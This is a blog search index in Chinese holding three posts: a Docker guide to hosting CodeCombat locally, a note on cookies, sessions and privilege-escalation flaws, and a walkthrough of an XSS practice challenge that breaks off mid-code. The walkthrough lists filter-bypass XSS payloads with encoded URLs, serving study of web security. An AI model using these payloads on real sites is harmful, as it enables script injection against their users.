<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Docker 搭建 codecombat 本地服务</title>
    <link href="/2023/03/20/2023-03-20.codecombat%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/03/20/2023-03-20.codecombat%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="1-创建容器"><a href="#1-创建容器" class="headerlink" title="1 创建容器"></a>1 创建容器</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 拉取codecombat镜像</span><br>docker pull operepo/ope-codecombat<br><br><span class="hljs-comment"># 创建 container</span><br>docker run -itd --name mycoco -p 0.0.0.0:3020:3000 operepo/ope-codecombat /bin/bash<br><br></code></pre></td></tr></table></figure><p>下载数据包：<a href="https://github.com/mingyue0094/the_the_tes/releases/download/v1.1/dump.tar.gz">dump.tar.gz</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 把数据包dump.tar.gz复制到容器内</span><br>docker <span class="hljs-built_in">cp</span> dump.tar.gz mycoco:/home/coco/codecombat/data/<br><br><span class="hljs-comment"># 进入容器</span><br>docker <span class="hljs-built_in">exec</span> -it mycoco /bin/bash<br><br><span class="hljs-comment"># 进入放数据的data目录</span><br><span class="hljs-built_in">cd</span> /home/coco/codecombat/data/<br><br><span class="hljs-comment"># 解压</span><br>tar -zxvf dump.tar.gz<br></code></pre></td></tr></table></figure><h1 id="2-配置-container-启动服务"><a href="#2-配置-container-启动服务" class="headerlink" title="2 配置 container 启动服务"></a>2 配置 container 启动服务</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入容器</span><br>docker <span class="hljs-built_in">exec</span> -it mycoco /bin/bash<br><br><span class="hljs-comment"># 服务自启动，将以下下内容加入 /root/.bashrc 文件末尾</span><br><br><span class="hljs-keyword">if</span> [ -f /root/.bashrc ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">cd</span> /home/coco/codecombat/ &amp;&amp; <span class="hljs-built_in">nohup</span> ./bin/coco-mongodb &gt; mycoco-mongodb.log 2&gt;&amp;1 &amp;<br>    <span class="hljs-built_in">cd</span> /home/coco &amp;&amp; <span class="hljs-built_in">nohup</span> sh start.sh &gt; mystart.log 2&gt;&amp;1 &amp;<br><span class="hljs-keyword">fi</span><br><br></code></pre></td></tr></table></figure><h1 id="3-超级管理员模式"><a href="#3-超级管理员模式" class="headerlink" title="3 超级管理员模式"></a>3 超级管理员模式</h1><p>打开 <a href="http://127.0.0.1:3020/">http://127.0.0.1:3020</a> 或自己电脑的 http:&#x2F;&#x2F;[ip]:3020 ，点击【注册】，要选择【独立账号】。</p><p>用个自己的邮箱和账号（英文就行），比如我的账号名为：mm</p><blockquote><p>Tips：出生日期往前面选一点，选择1990年之前，否则判定不是家长，就无法注册。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入容器</span><br>docker <span class="hljs-built_in">exec</span> -it mycoco /bin/bash<br><span class="hljs-comment"># 打开数据库</span><br>mongo<br><span class="hljs-comment"># 使用cocoo数据库</span><br>use coco<br><span class="hljs-comment"># 将 mm 账号升级为“超级管理员模式”，这里 mm 为你自己注册时候用的名字</span><br>db.users.update(&#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;mm&#x27;</span>&#125;,&#123;<span class="hljs-variable">$set</span>:&#123;<span class="hljs-string">&#x27;earned.gems&#x27;</span>:9999999,permissions:[<span class="hljs-string">&quot;godmode&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>]&#125;&#125;,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>);<br><br></code></pre></td></tr></table></figure><blockquote><p>Tip:刷新页面。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Coding</category>
      
      <category>game</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Coding</tag>
      
      <tag>game</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>越权、cookie和session</title>
    <link href="/2022/08/24/2022-08-24.%E8%B6%8A%E6%9D%83_cookie_session/"/>
    <url>/2022/08/24/2022-08-24.%E8%B6%8A%E6%9D%83_cookie_session/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-cookie-%E5%92%8C-session-%E7%9A%84%E4%BD%9C%E7%94%A8">1 cookie 和 session 的作用</a><ul><li><a href="#11-cookie">1.1 cookie</a></li><li><a href="#12-session">1.2 session</a></li></ul></li><li><a href="#2-%E8%B6%8A%E6%9D%83%E4%B8%8E-session_id-%E7%9A%84%E6%A0%A1%E9%AA%8C">2 越权与 session_id 的校验</a><ul><li><a href="#21-%E8%B6%8A%E6%9D%83%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8E%9F%E5%9B%A0">2.1 越权存在的原因</a></li><li><a href="#22-%E8%B6%8A%E6%9D%83%E5%AD%98%E5%9C%A8%E7%9A%84%E4%BD%8D%E7%BD%AE">2.2 越权存在的位置</a></li></ul></li></ul><h1 id="1-cookie-和-session-的作用"><a href="#1-cookie-和-session-的作用" class="headerlink" title="1 cookie 和 session 的作用"></a>1 cookie 和 session 的作用</h1><h2 id="1-1-cookie"><a href="#1-1-cookie" class="headerlink" title="1.1 cookie"></a>1.1 cookie</h2><ul><li>cookie 存放在客户端，是客户端保持状态的方案。</li></ul><ol><li>持久 cookie: 网易邮箱登录的时候会提示保持登录时间7天，就会设置session_id的生存时间为7天，并保存在本地硬盘上。</li><li>会话 cookie: 不设置过期时间，在浏览器关闭后 cookie session 失效</li></ol><ul><li>cookie 的主要作用之一是记录 session_id </li><li>不管用户登录或者不登录服务器都会发送 cookie 给客户端</li></ul><h2 id="1-2-session"><a href="#1-2-session" class="headerlink" title="1.2 session"></a>1.2 session</h2><ul><li>session 存放在服务器端，是服务器端保持状态的方案</li><li>在服务器端保持状态的方案在客户端也需要保存一个标识，所以 session 机制需要借助于 cookie 机制来达到保存标识的目的</li><li>session 的失效时间：</li></ul><ol><li>程序调用HttpSession.invalidate()</li><li>距离上一次收到客户端发送的session id时间间隔超过了session的最大有效时间</li><li>服务器进程被停止<blockquote><p>Tips: 关闭浏览器只会使存储在客户端浏览器内存中的 cookie session 失效，不会使服务器端的 session 对象失效。</p></blockquote></li></ol><h1 id="2-越权与-session-id-的校验"><a href="#2-越权与-session-id-的校验" class="headerlink" title="2 越权与 session_id 的校验"></a>2 越权与 session_id 的校验</h1><h2 id="2-1-越权存在的原因"><a href="#2-1-越权存在的原因" class="headerlink" title="2.1 越权存在的原因"></a>2.1 越权存在的原因</h2><ul><li>在进行方法调用的时候，未进行请求用户 cookie 中的 session_id 和目标信息拥有者 session_id 是否匹配一致，直接用用户 id 或者其他 id 进行了匹配</li></ul><h2 id="2-2-越权存在的位置"><a href="#2-2-越权存在的位置" class="headerlink" title="2.2 越权存在的位置"></a>2.2 越权存在的位置</h2><ul><li>水平越权：登录注册、密码找回、信息查看、交易支付</li><li>垂直越权：高低权限账号权限不同的所有位置</li></ul><p>参考内容：</p><p><a href="https://developer.aliyun.com/article/684252">cookie与session作用、区别、应用范围、session的工作原理</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>PenTest</category>
      
      <category>越权</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>PenTest</tag>
      
      <tag>越权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>耗子XSS</title>
    <link href="/2022/08/11/2022-08-11.%E8%80%97%E5%AD%90XSS/"/>
    <url>/2022/08/11/2022-08-11.%E8%80%97%E5%AD%90XSS/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#0x00">0x00</a></li><li><a href="#0x01">0x01</a></li><li><a href="#0x02">0x02</a></li><li><a href="#0x03">0x03</a></li><li><a href="#0x04">0x04</a></li><li><a href="#0x05">0x05</a></li><li><a href="#0x06">0x06</a></li><li><a href="#0x07">0x07</a></li><li><a href="#0x08">0x08</a></li><li><a href="#0x09">0x09</a></li><li><a href="#0x0a">0x0A</a></li><li><a href="#0x0b">0x0B</a></li><li><a href="#0x0c">0x0C</a></li><li><a href="#0x0d">0x0D</a></li><li><a href="#0x0e">0x0E</a></li><li><a href="#0x0f">0x0F</a></li><li><a href="#0x10">0x10</a></li><li><a href="#0x11">0x11</a></li><li><a href="#0x12">0x12</a></li></ul><p><a href="https://xss.haozi.me/">耗子XSS</a></p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><ul><li>server 源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cscript%3Ealert(1)%3C%2Fscript%3E<br></code></pre></td></tr></table></figure><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><ul><li>server 源码</li></ul><p>输入参数被放在文本标签里，文本标签前后闭合即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;textarea&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/textarea&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3C%2Ftextarea%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Ctextarea%3E<br></code></pre></td></tr></table></figure><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><ul><li>server 源码</li></ul><p>参数作为 <code>&lt;input&gt;</code> 标签的 value 回显到前端，可以闭合 value 加上onclick事件，或者闭合 <code>&lt;input&gt;</code> 添加 alert</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>&quot; onclick=alert(1) &quot;<br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x27;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;&gt;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(1)</span> &quot;&quot;&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=&#x27;%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E<br><br>http://xss.test/?input=%22%20onclick%3Dalert(1)%20%22<br></code></pre></td></tr></table></figure><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><ul><li>server 源码</li></ul><p>过滤括号 <code>[()]</code>，可以使用反引号代替，html编码绕过，或者引用外部js文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">stripBracketsRe</span> = /[()]/g<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> input<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"># 反引号<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br><br># html编码绕过<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"># 反引号<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br># html编码绕过<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs url"># 反引号<br>http://xss.test/?input=%3Cscript%3Ealert%601%60%3C%2Fscript%3E%20<br><br># html编码绕过<br>http://xss.test/?input=%3Cimg%20src%3D%23%20onerror%3Dalert%26%23x28%3B1%26%23x29%3B%3E<br><br></code></pre></td></tr></table></figure><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><ul><li>server 源码</li></ul><p>反引号也被过滤，html编码绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">stripBracketsRe</span> = /[()`]/g<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> input<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span> <br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cimg%20src%3D%23%20onerror%3Dalert%26%23x28%3B1%26%23x29%3B%3E%20<br></code></pre></td></tr></table></figure><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><ul><li>server 源码</li></ul><p>过滤 –&gt; 防止标签闭合，–!&gt; 同样可以闭合标签</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/--&gt;/g, <span class="hljs-string">&#x27;😂&#x27;</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;!-- &#x27;</span> + input + <span class="hljs-string">&#x27; --&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">--!&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span> <br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- --!&gt;&lt;img src=# onerror=alert&amp;#x28;1&amp;#x29;&gt;  --&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=--!%3E%3Cimg%20src%3D%23%20onerror%3Dalert%26%23x28%3B1%26%23x29%3B%3E%20<br></code></pre></td></tr></table></figure><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><ul><li>server 源码</li></ul><p>过滤 auto|on.*&#x3D;|&gt; ，使用换行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/auto|on.*=|&gt;/ig, <span class="hljs-string">&#x27;_&#x27;</span>)<br>  <span class="hljs-keyword">return</span> `&lt;input value=<span class="hljs-number">1</span> $&#123;input&#125; type=<span class="hljs-string">&quot;text&quot;</span>&gt;`<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">type=&quot;image&quot; src=# onerror<br>=alert(1)<br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">1</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span></span><br><span class="hljs-tag">=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=type%3D%22image%22%20src%3D%23%20onerror%0A%3Dalert(1)<br></code></pre></td></tr></table></figure><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><ul><li>server 源码</li></ul><p>过滤 &lt;/?[^&gt;]+&gt; ，对&lt;&gt;括起来的内容进行过滤替换成空,但是由于HTML的容错性极高,所以,对于不闭合也能接受</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">stripTagsRe</span> = /&lt;\/?[^&gt;]+&gt;/gi<br><br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(stripTagsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span></span><br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span> &lt;/<span class="hljs-attr">article</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cimg%20src%3D%23%20onerror%3Dalert(1)%20<br></code></pre></td></tr></table></figure><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><ul><li>server 源码</li></ul><p>过滤 </style> 标签，</style > 加空格即可绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">src</span>) </span>&#123;<br>  src = src.<span class="hljs-title function_ invoke__">replace</span>(/&lt;\/style&gt;/ig, <span class="hljs-string">&#x27;/* \u574F\u4EBA */&#x27;</span>)<br>  <span class="hljs-keyword">return</span> `<br>    &lt;style&gt;<br>      $&#123;src&#125;<br>    &lt;/style&gt;<br>  `<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>插入代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;/style &gt; <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>网页代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-xml"></span><br><span class="language-xml">      &lt;/style &gt; <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3C%2Fstyle%20%3E%20%3Cscript%3Ealert(1)%3C%2Fscript%3E<br></code></pre></td></tr></table></figure><h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><ul><li>server 源码</li></ul><p>过滤了不是以<a href="https://www.sogmentfault.com开头的字符串,以https//www.sogmentfault.com%E5%BC%80%E5%A4%B4%EF%BC%8C%E9%97%AD%E5%90%88%E6%A0%87%E7%AD%BE%E5%8D%B3%E5%8F%AF">https://www.sogmentfault.com开头的字符串，以https://www.sogmentfault.com开头，闭合标签即可</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  let domainRe = 